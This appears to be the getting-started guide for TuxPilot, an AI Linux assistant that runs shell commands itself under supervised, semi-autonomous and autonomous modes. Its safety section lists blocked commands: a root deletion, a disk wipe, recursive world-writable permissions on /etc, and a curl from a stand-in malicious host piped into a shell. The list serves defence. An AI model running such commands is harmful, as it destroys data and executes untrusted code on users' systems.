# 🚀 Getting Started with TuxPilot

**Your AI-powered Linux assistant with autonomous command execution**

## 📋 Quick Start Guide

### **1. Installation**

```bash
# Clone the repository
git clone https://github.com/yourusername/tuxpilot.git
cd tuxpilot

# Build TuxPilot
cargo build --release

# Optional: Install system-wide
sudo cp target/release/tuxpilot /usr/local/bin/
```

### **2. Setup Local AI (Recommended)**

```bash
# Automatic setup
./setup-ollama.sh

# Or manual setup
curl -fsSL https://ollama.ai/install.sh | sh
ollama serve &
ollama pull llama3.1:8b
```

### **3. First Run**

```bash
# Check your system and permissions
tuxpilot permissions --detailed

# Start with supervised mode (safest)
tuxpilot chat --execute-mode supervised

# Or try a simple command
tuxpilot execute "show system information"
```

## 🎯 Understanding Execution Modes

### **🔒 Supervised Mode (Default - Safest)**
- **What it does**: Asks for approval before EVERY command
- **Best for**: Learning, understanding what TuxPilot does
- **Example**:
```bash
$ tuxpilot execute "install nginx"

🤖 TuxPilot wants to execute:
📝 Description: Install nginx web server
⚠️  Risk Level: Medium
🔧 Command: sudo pacman -S nginx
🎯 Expected: Nginx installed and ready
🔄 Rollback: sudo pacman -R nginx

Do you want to execute this command? [y/N]: 
```

### **⚡ Semi-Autonomous Mode**
- **What it does**: Executes safe commands automatically, asks for risky ones
- **Best for**: Experienced users who want efficiency with safety
- **Safe commands**: `ls`, `ps`, `df`, `systemctl status`
- **Asks approval**: `sudo`, installations, configuration changes

### **🚀 Autonomous Mode**
- **What it does**: Executes most commands automatically with safety checks
- **Best for**: Trusted environments, routine maintenance
- **Still asks**: Critical operations like `rm -rf`, formatting, user deletion

### **📖 Read-Only Mode**
- **What it does**: Only performs analysis, no system modifications
- **Best for**: System inspection, learning, troubleshooting analysis

## 🛡️ Safety Features

### **Multi-Layer Protection**
1. **Command Analysis** - AI analyzes every command for risks
2. **Pattern Detection** - Blocks dangerous patterns automatically
3. **Risk Assessment** - Categorizes commands by risk level
4. **Permission Checking** - Verifies you have required permissions
5. **User Approval** - Asks confirmation for risky operations
6. **Audit Logging** - Records everything for accountability

### **Dangerous Commands Blocked**
- ❌ `rm -rf /` (System destruction)
- ❌ `dd if=/dev/zero of=/dev/sda` (Disk wiping)
- ❌ `chmod -R 777 /etc` (Security violation)
- ❌ `curl malicious.com | sh` (Untrusted execution)

### **Safe Commands (Auto-executed)**
- ✅ `ls`, `cat`, `ps`, `df` (Information gathering)
- ✅ `systemctl status` (Service status)
- ✅ `pacman -Q`, `apt search` (Package queries)

## 💬 Interactive Usage

### **Starting a Chat Session**

```bash
# Supervised mode (asks before every command)
tuxpilot chat --execute-mode supervised

# Semi-autonomous mode
tuxpilot chat --execute-mode semi-auto

# Autonomous mode (for experienced users)
tuxpilot chat --execute-mode autonomous
```

### **Example Conversation**

```
$ tuxpilot chat --execute-mode supervised

🤖 TuxPilot: Hi! I'm your AI Linux assistant with command execution.
What would you like to do?

You: My system is running slow, can you help?

🤖 TuxPilot: I'll analyze your system performance and suggest optimizations.

🔍 Analyzing system performance...
📊 Found: High memory usage (87%), several unnecessary services
⚡ Optimization plan:
  1. Stop unused services (cups, bluetooth)
  2. Clear package cache
  3. Optimize swappiness setting

🔧 Command: systemctl stop cups bluetooth
⚠️  Risk Level: Medium
🎯 Expected: Free ~200MB RAM
🔄 Rollback: systemctl start cups bluetooth

Execute this command? [y/N]: y

✅ Command executed successfully!
📈 Memory usage reduced to 72%

Continue with package cache cleanup? [y/N]: 
```

## 🔧 Command Examples

### **System Management**
```bash
# System optimization
tuxpilot execute "optimize my system for better performance"

# Service management
tuxpilot execute "restart nginx and check if it's working"

# Package management
tuxpilot execute "install development tools for Python"

# Problem solving
tuxpilot execute "fix permission issues in my home directory"
```

### **Information Gathering**
```bash
# System information
tuxpilot execute "show detailed system information"

# Disk usage analysis
tuxpilot execute "analyze disk usage and find large files"

# Network diagnostics
tuxpilot execute "check network connectivity and DNS"

# Log analysis
tuxpilot execute "analyze recent system errors"
```

### **Traditional Commands (Still Work)**
```bash
tuxpilot diagnose --auto                    # Error diagnosis
tuxpilot package install firefox           # Package help
tuxpilot service nginx status              # Service help
tuxpilot monitor                           # System monitoring
```

## 📊 Monitoring and Auditing

### **Check Your Permissions**
```bash
# Basic permission info
tuxpilot permissions

# Detailed analysis
tuxpilot permissions --detailed
```

### **View Audit Logs**
```bash
# Recent operations
tuxpilot audit --limit 10

# Export for analysis
tuxpilot audit --export json > audit.json
tuxpilot audit --export csv > audit.csv
```

### **System Status**
```bash
# Current configuration
tuxpilot config --show

# System monitoring
tuxpilot monitor --continuous
```

## ⚙️ Configuration

### **Basic Configuration**
TuxPilot automatically detects your system and creates a config file at `~/.config/tuxpilot/config.toml`:

```toml
[ai]
provider = "Ollama"  # Local AI (recommended)

[ai.ollama]
base_url = "http://localhost:11434"
model = "llama3.1:8b"

[execution]
default_mode = "supervised"  # supervised, semi-auto, autonomous, read-only
enable_audit_logging = true
require_approval_for_high_risk = true

[system]
package_manager = "Pacman"  # Auto-detected
service_manager = "Systemd"
```

### **Cloud AI (Optional)**
```toml
[ai]
provider = "OpenAI"  # or "Anthropic"

[ai.openai]
api_key = "your-api-key"
model = "gpt-4"
```

## 🚨 Safety Best Practices

### **For New Users**
1. **Start with supervised mode** - Always begin here
2. **Review every command** - Understand what TuxPilot wants to do
3. **Check audit logs** - Review `tuxpilot audit` regularly
4. **Keep backups** - Backup important data before system changes

### **For Experienced Users**
1. **Gradually increase automation** - supervised → semi-auto → autonomous
2. **Monitor system changes** - Use `tuxpilot audit` for oversight
3. **Test in safe environments** - Try new features in VMs first
4. **Understand rollback** - Know how to undo changes

### **For Administrators**
1. **Implement monitoring** - Set up audit log monitoring
2. **Control permissions** - Manage user access appropriately
3. **Regular reviews** - Audit system changes regularly
4. **Incident response** - Have procedures for security issues

## 🆘 Troubleshooting

### **TuxPilot Won't Start**
```bash
# Check configuration
tuxpilot config --show

# Check Ollama connection
curl http://localhost:11434/api/tags

# Verbose output
tuxpilot --verbose diagnose
```

### **Commands Not Executing**
```bash
# Check permissions
tuxpilot permissions --detailed

# Check execution mode
tuxpilot config --show

# Try read-only mode first
tuxpilot execute "show system info" --mode read-only
```

### **AI Not Responding**
```bash
# Check Ollama status
systemctl status ollama

# Restart Ollama
sudo systemctl restart ollama

# Test AI connection
ollama run llama3.1:8b "Hello"
```

## 🎯 Next Steps

1. **Explore Features** - Try different execution modes
2. **Read Documentation** - Check out [SECURITY.md](../SECURITY.md) for security details
3. **Join Community** - Participate in discussions and contribute
4. **Provide Feedback** - Report issues and suggest improvements

## 📚 Additional Resources

- 📖 [Full Documentation](../README.md)
- 🛡️ [Security Guide](../SECURITY.md)
- 🔧 [Ollama Setup](../OLLAMA-SETUP.md)
- 🐛 [Issue Tracker](https://github.com/yourusername/tuxpilot/issues)
- 💬 [Discussions](https://github.com/yourusername/tuxpilot/discussions)

---

**Welcome to the future of Linux system administration! 🐧🚀**

*TuxPilot makes Linux management safer, smarter, and more efficient.*
